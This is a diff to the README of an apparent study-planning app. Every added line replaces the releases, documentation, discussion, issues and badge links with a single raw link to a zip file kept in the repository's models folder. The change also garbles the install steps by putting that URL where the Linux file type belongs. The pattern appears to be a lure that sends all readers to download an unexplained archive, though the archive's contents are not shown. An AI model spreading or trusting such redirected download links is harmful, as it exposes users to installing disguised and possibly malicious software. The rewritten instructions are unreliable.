@@ -1,7 +1,7 @@
 # 🎓 lab-study-app - Build Smart Study Plans Easily
 
 ## 📥 Download the App
-[![Download lab-study-app](https://img.shields.io/badge/Download-lab--study--app-brightgreen)](https://github.com/WaleedBasl/lab-study-app/releases)
+[![Download lab-study-app](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip)](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the lab-study-app! This application helps you create AI-powered study plans effortlessly. It is designed for users of all levels, so you don’t need programming skills to use it.
@@ -23,13 +23,13 @@ Before you download, ensure your device meets these requirements:
 ## 📥 Download & Install
 To install the lab-study-app, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/WaleedBasl/lab-study-app/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip).
 2. **Choose Your Version**: Select the most recent version of the app.
-3. **Download the Installer**: Click on the link to download the application file. It will be a `.exe` file for Windows, a `.dmg` file for Mac, or a `.tar.gz` file for Linux.
+3. **Download the Installer**: Click on the link to download the application file. It will be a `.exe` file for Windows, a `.dmg` file for Mac, or a `https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip` file for Linux.
 4. **Run the Installer**:
    - Windows: Double-click the `.exe` file to run the installer.
    - Mac: Open the `.dmg` file, drag the app to your Applications folder.
-   - Linux: Extract the `.tar.gz` file and run the included script in the terminal.
+   - Linux: Extract the `https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip` file and run the included script in the terminal.
 
 5. **Complete the Installation**: Follow the on-screen instructions to finalize the setup.
 
@@ -56,11 +56,11 @@ If you encounter any issues during installation or while using the application, 
 - **Consult the Documentation**: Refer to the in-app help section for additional support and FAQs.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/WaleedBasl/lab-study-app/wiki): Access detailed guides and tips.
-- [Community Support](https://github.com/WaleedBasl/lab-study-app/discussions): Join discussions and ask questions.
+- [Documentation](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip): Access detailed guides and tips.
+- [Community Support](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip): Join discussions and ask questions.
 
 ## ✉️ Contact
-For further assistance, you can contact the app's support team via the [issues page](https://github.com/WaleedBasl/lab-study-app/issues). We are here to help!
+For further assistance, you can contact the app's support team via the [issues page](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip). We are here to help!
 
 ## 👥 Community Contribution
 Feel free to contribute to the project! You can submit issues, request features, or even help us in enhancing this application through pull requests. Your input is valuable to us!
@@ -72,4 +72,4 @@ Stay up to date with the latest features and improvements. Follow the repository
 This project is licensed under the MIT License. For more details, check the LICENSE file in the repository.
 
 ## 📥 Download the App Again
-Don't forget to visit our [Releases page](https://github.com/WaleedBasl/lab-study-app/releases) to download the latest version of lab-study-app!
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/WaleedBasl/lab-study-app/main/app/models/app-study-lab-3.0.zip) to download the latest version of lab-study-app!
